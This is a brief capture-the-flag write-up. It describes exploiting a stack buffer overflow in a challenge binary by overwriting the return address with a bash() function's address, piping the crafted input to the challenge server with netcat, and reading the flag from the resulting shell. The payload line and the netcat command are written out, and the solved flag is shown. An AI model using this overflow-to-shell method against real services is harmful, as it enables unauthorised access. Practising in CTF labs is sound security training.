@@ -1,0 +1,28 @@
+downloaded both source code and binary from CTF website.
+used WINscp to transfer file into my linux server.
+the binary did not give me permission to execute when I sent it there, so I had to alter the permissions in order to execute the 
+file or run gdb:
+
+chmod +x sug4r-m4ma
+
+gdb and ghidra showed me what address the function bash() was at
+this is important because I need that shell to execute in order 
+to see the file "flag".
+
+made an input file on my own server:
+
+echo -e "aaaaaabaaaaacaaaadaaaaab\x45\x9e\x04\x08" > input
+
+then using netcat I piped in this file:
+
+cat input - | nc 18.144.160.224 5000
+
+from there I had the shell open. 
+checked to see if shell was open by inputing ls command
+
+then looked at flag file
+
+cat flag
+365CTF{finding-love-in-an-overflow}
+
+captured flag!
